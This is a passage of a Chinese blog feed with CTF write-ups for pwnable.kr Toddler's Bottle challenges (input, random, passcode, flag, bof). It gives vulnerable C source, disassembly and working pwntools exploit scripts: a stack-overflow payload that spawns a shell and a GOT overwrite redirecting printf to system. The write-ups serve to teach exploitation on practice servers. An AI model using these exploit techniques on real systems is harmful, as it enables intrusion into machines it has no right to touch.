class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">r_in, w_in = os.pipe()</span><br><span class="line">r_err, w_err = os.pipe()</span><br><span class="line">env = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage1</span>():</span></span><br><span class="line">    argv[<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)] = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    argv[<span class="built_in">ord</span>(<span class="string">&#x27;B&#x27;</span>)] = <span class="string">&#x27;\x20\x0a\x0d&#x27;</span></span><br><span class="line">    argv[<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)] = <span class="string">&#x27;13145&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage2</span>():</span></span><br><span class="line">    os.write(w_in, <span class="string">b&#x27;\x00\x0a\x00\xff&#x27;</span>)</span><br><span class="line">    os.write(w_err, <span class="string">b&#x27;\x00\x0a\x02\xff&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage3</span>():</span></span><br><span class="line">    env[<span class="string">b&#x27;\xde\xad\xbe\xef&#x27;</span>] = <span class="string">b&#x27;\xca\xfe\xba\xbe&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage4</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;\x0a&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage5</span>():</span></span><br><span class="line">    s = socket.socket()</span><br><span class="line">    s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">13145</span>))</span><br><span class="line">    s.send(<span class="string">b&#x27;\xde\xad\xbe\xef&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">stage1()</span><br><span class="line">stage2()</span><br><span class="line">stage3()</span><br><span class="line">stage4()</span><br><span class="line"></span><br><span class="line">p = process(executable = <span class="string">&#x27;./input&#x27;</span>, argv = argv, stdin = r_in, stderr = r_err, env = env)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">stage5()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>由于这个脚本需要传入argv、env、stdin、stderr并且还需要用socket发送消息，因此将脚本上传至服务器比较方便。</p><p>在pwnable.kr服务器中，/tmp目录权限为<code>rwxrwx-wt</code>，所以我们可以在/tmp下创建自己的目录，将脚本上传到该目录中。</p><p>由于input和flag文件都在/home/input2中，所以可以在自己创建的目录下做这两个文件的软链接来完成后续操作。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;原题内容&quot;&gt;原题内容&lt;/h2&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l</summary>
      
    
    
    
    <category term="pwnable" scheme="https://www.ruomo.fun/categories/pwnable/"/>
    
    
    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
    
    <category term="pwnable" scheme="https://www.ruomo.fun/tags/pwnable/"/>
    
  </entry>
  
  <entry>
    <title>random</title>
    <link href="https://www.ruomo.fun/2021/06/04/pwnable/Toddlers_Bottle/random/"/>
    <id>https://www.ruomo.fun/2021/06/04/pwnable/Toddlers_Bottle/random/</id>
    <published>2021-06-04T07:17:07.433Z</published>
    <updated>2021-06-04T07:26:46.352Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原题内容">原题内容</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Daddy, teach me how to use random value in programming!</span><br><span class="line"></span><br><span class="line">ssh random@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目附件：<a href="/files/pwnable/toddlers_bottle/random">点我下载</a></p><h2 id="程序源码">程序源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">random = rand();<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Good!\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Wrong, maybe you should try 2^32 cases.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目分析">题目分析</h2><p>程序取出随机数random，然后和输入的key异或，若结果等于0xdeadbeef，那么就输出flag。</p><p>仔细观察，发现没有设置随机数种子，那么就是伪随机。</p><p>在自己的linux机子或者在pwnable.kr服务器上写一个random.c，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">random = rand();</span><br><span class="line">prinf(<span class="string">&quot;%u\n&quot;</span>, random ^ <span class="number">0xdeadbeef</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后运行得到key的值为<code>3039230856</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;原题内容&quot;&gt;原题内容&lt;/h2&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l</summary>
      
    
    
    
    <category term="pwnable" scheme="https://www.ruomo.fun/categories/pwnable/"/>
    
    
    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
    
    <category term="pwnable" scheme="https://www.ruomo.fun/tags/pwnable/"/>
    
  </entry>
  
  <entry>
    <title>passcode</title>
    <link href="https://www.ruomo.fun/2021/06/03/pwnable/Toddlers_Bottle/passcode/"/>
    <id>https://www.ruomo.fun/2021/06/03/pwnable/Toddlers_Bottle/passcode/</id>
    <published>2021-06-03T12:38:54.259Z</published>
    <updated>2021-06-03T13:22:49.791Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原题内容">原题内容</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Mommy told me to make a passcode based login system.</span><br><span class="line">My initial C code was compiled without any error!</span><br><span class="line">Well, there was some compiler warning, but who cares about that?</span><br><span class="line"></span><br><span class="line">ssh passcode@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目附件：<a href="/files/pwnable/toddlers_bottle/passcode">点我下载</a></p><h2 id="程序源码">程序源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> passcode1;</span><br><span class="line"><span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enter passcode1 : &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode1);</span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enter passcode2 : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;checking...\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login OK!\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login Failed!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enter you name : &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome %s!\n&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">welcome();</span><br><span class="line">login();</span><br><span class="line"></span><br><span class="line"><span class="comment">// something after login...</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now I can safely trust you that you have credential :)\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目分析">题目分析</h2><p>题目开始进入函数<code>welcome</code>，输入最长100个字符的name值，可以看到并不会造成栈溢出。</p><p>继续看到<code>login</code>函数，很容易发现两个<code>scanf</code>函数的passcode变量均没有添加取地址符号，那么在<code>scanf</code>时会将passcode所指向的内存地址改变。（这点可能不是很明了，在后续的分析中可能会更容易理解一点，先记住这一点）</p><p>checksec结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/passcode/passcode&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>到这边似乎并没有什么思路，但是可以发现<code>RELRO</code>的值是<strong>Partial RELRO</strong>，说明该程序的GOT表可写。</p><p><code>objdump -R</code>查看GOT表结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">passcode:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE</span><br><span class="line">08049ff0 R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">0804a02c R_386_COPY        stdin@@GLIBC_2.0</span><br><span class="line">0804a000 R_386_JUMP_SLOT   <span class="built_in">printf</span>@GLIBC_2.0</span><br><span class="line">0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0</span><br><span class="line">0804a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4</span><br><span class="line">0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0</span><br><span class="line">0804a010 R_386_JUMP_SLOT   system@GLIBC_2.0</span><br><span class="line">0804a014 R_386_JUMP_SLOT   __gmon_start__</span><br><span class="line">0804a018 R_386_JUMP_SLOT   <span class="built_in">exit</span>@GLIBC_2.0</span><br><span class="line">0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7</span><br></pre></td></tr></table></figure><p>暂时先放着，可能后续会使用到。接下来查看passcode的反汇编代码，看看能否找到利用点。（由于代码太长，这里只展示关键部分）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">08048564 &lt;login&gt;:</span><br><span class="line"> 8048625:       e8 f6 fd ff ff          call   8048420 &lt;printf@plt&gt;</span><br><span class="line"> 804857c:       8b 55 f0                mov    -0x10(%ebp),%edx</span><br><span class="line"> 804857f:       89 54 24 04             mov    %edx,0x4(%esp)</span><br><span class="line"> 8048583:       89 04 24                mov    %eax,(%esp)</span><br><span class="line"> 8048586:       e8 15 ff ff ff          call   80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line"> 80485e3:       c7 04 24 af 87 04 08    movl   $0x80487af,(%esp)</span><br><span class="line"> 80485ea:       e8 71 fe ff ff          call   8048460 &lt;system@plt&gt;</span><br><span class="line"> </span><br><span class="line">08048609 &lt;welcome&gt;:</span><br><span class="line"> 804862f:       8d 55 90                lea    -0x70(%ebp),%edx</span><br><span class="line"> 8048632:       89 54 24 04             mov    %edx,0x4(%esp)</span><br><span class="line"> 8048636:       89 04 24                mov    %eax,(%esp)</span><br><span class="line"> 8048639:       e8 62 fe ff ff          call   80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line"> </span><br><span class="line">08048665 &lt;main&gt;:</span><br><span class="line"> 804867a:       e8 8a ff ff ff          call   8048609 &lt;welcome&gt;</span><br><span class="line"> 804867f:       e8 e0 fe ff ff          call   8048564 &lt;login&gt;</span><br></pre></td></tr></table></figure><p>首先从main开始，可以发现函数<code>welcome</code>和函数<code>login</code>是连续调用的，这说明这两个函数在执行的时候栈底（ebp）是相同的。然后来到welcome函数，可以发现name的起始位置是<code>-0x70(%ebp)</code>，而在login函数中，passcode1的起始位置是<code>-0x10(%ebp)</code>。这两个变量只相差了96个字节，而name可接受的字符串长度为100个字节，也就是说在输入name时最后4个字节可以覆盖掉passcode1的地址。</p><p>结合GOT表可写，我们现在的思路大致为：</p><ol><li>输入100个字符的name字符串，使得它最后4个字符覆盖passcode1的地址，让passcode1指向GOT表中某个函数的地址；</li><li>在scanf输入passcode1的时候将system地址写入，那么在调用对应被覆写函数时就会跳转到system函数调用。</li></ol><p>这边选取<code>printf</code>函数来覆写。</p><h2 id="脚本源码">脚本源码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">s = ssh(host=&#x27;pwnable.kr&#x27;, user=&#x27;passcode&#x27;, password=&#x27;guest&#x27;, port=2222)</span><br><span class="line">shellcode = b&#x27;a&#x27; * 0x60 + p32(0x0804a000)</span><br><span class="line">process = s.process([&#x27;./passcode&#x27;])</span><br><span class="line">process.sendline(shellcode)</span><br><span class="line">process.sendline(&quot;134514147&quot;)</span><br><span class="line">process.recvuntil(&#x27;passcode1 : &#x27;)</span><br><span class="line"></span><br><span class="line">flag = (process.recvline()).decode()</span><br><span class="line"></span><br><span class="line">print(&quot;Flag: &#123;&#125;&quot;.format(flag))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;原题内容&quot;&gt;原题内容&lt;/h2&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l</summary>
      
    
    
    
    <category term="pwnable" scheme="https://www.ruomo.fun/categories/pwnable/"/>
    
    
    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
    
    <category term="pwnable" scheme="https://www.ruomo.fun/tags/pwnable/"/>
    
  </entry>
  
  <entry>
    <title>flag</title>
    <link href="https://www.ruomo.fun/2021/06/03/pwnable/Toddlers_Bottle/flag/"/>
    <id>https://www.ruomo.fun/2021/06/03/pwnable/Toddlers_Bottle/flag/</id>
    <published>2021-06-03T12:30:19.589Z</published>
    <updated>2021-06-03T13:25:19.017Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原题内容">原题内容</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Papa brought me a packed present! let&#x27;s open it.</span><br><span class="line"></span><br><span class="line">Download : http://pwnable.kr/bin/flag</span><br><span class="line"></span><br><span class="line">This is reversing task. all you need is binary</span><br></pre></td></tr></table></figure><p>题目附件：<a href="/files/pwnable/toddlers_bottle/flag">点我下载</a></p><h2 id="题目分析">题目分析</h2><p>直接给了一个附件，那就是在文件里找flag或者想办法搞到flag了。</p><p>用ida-64打开flag，发现只有4个函数，Shift + F12找到关键词<code>//upx.sf.net $\n</code>，说明该文件使用upx加壳了，那就先脱壳。这边用UPXShell来进行脱壳。<a href="/files/tools/UPXShell.exe">点我下载UPXShell</a></p><p>脱壳后再打开，Shift + F12先搜索&quot;flag&quot;试试，直接搜到flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;原题内容&quot;&gt;原题内容&lt;/h2&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l</summary>
      
    
    
    
    <category term="pwnable" scheme="https://www.ruomo.fun/categories/pwnable/"/>
    
    
    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
    
    <category term="pwnable" scheme="https://www.ruomo.fun/tags/pwnable/"/>
    
  </entry>
  
  <entry>
    <title>bof</title>
    <link href="https://www.ruomo.fun/2021/06/03/pwnable/Toddlers_Bottle/bof/"/>
    <id>https://www.ruomo.fun/2021/06/03/pwnable/Toddlers_Bottle/bof/</id>
    <published>2021-06-03T06:04:19.090Z</published>
    <updated>2021-06-03T12:30:13.409Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原题内容">原题内容</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nana told me that buffer overflow is one of the most common software vulnerability. </span><br><span class="line">Is that true?</span><br><span class="line"></span><br><span class="line">Download : http://pwnable.kr/bin/bof</span><br><span class="line">Download : http://pwnable.kr/bin/bof.c</span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9000</span><br></pre></td></tr></table></figure><p>题目附件：<a href="/files/pwnable/toddlers_bottle/bof">点我下载</a></p><h2 id="程序源码">程序源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">gets(overflowme);<span class="comment">// smash me!</span></span><br><span class="line"><span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">func(<span class="number">0xdeadbeef</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目分析">题目分析</h2><p>很基础的一题栈溢出，ida打开查看栈空间如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-0000002C s               db 32 dup(?)</span><br><span class="line">-0000000C var_C           dd ?</span><br><span class="line">-00000008                 db ? ; undefined</span><br><span class="line">-00000007                 db ? ; undefined</span><br><span class="line">-00000006                 db ? ; undefined</span><br><span class="line">-00000005                 db ? ; undefined</span><br><span class="line">-00000004                 db ? ; undefined</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 arg_0           dd ?</span><br></pre></td></tr></table></figure><p>计算得到填充<code>0x2C + 0x8</code>个字符即可到达<code>arg_0</code>所在位置。</p><h2 id="脚本源码">脚本源码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">nc = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9000</span>)</span><br><span class="line">shellcode = <span class="string">b&#x27;a&#x27;</span> * <span class="number">52</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line">nc.sendline(shellcode)</span><br><span class="line">nc.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;原题内容&quot;&gt;原题内容&lt;/h2&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l</summary>
      
    
    
    
    <category term="pwnable" scheme="https://www.ruomo.fun/categories/pwnable/"/>
    
    
    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
    
    <category term="pwnable" scheme="https://www.ruomo.fun/tags/pwnable/"/>
    
  </entry>
  
</feed>
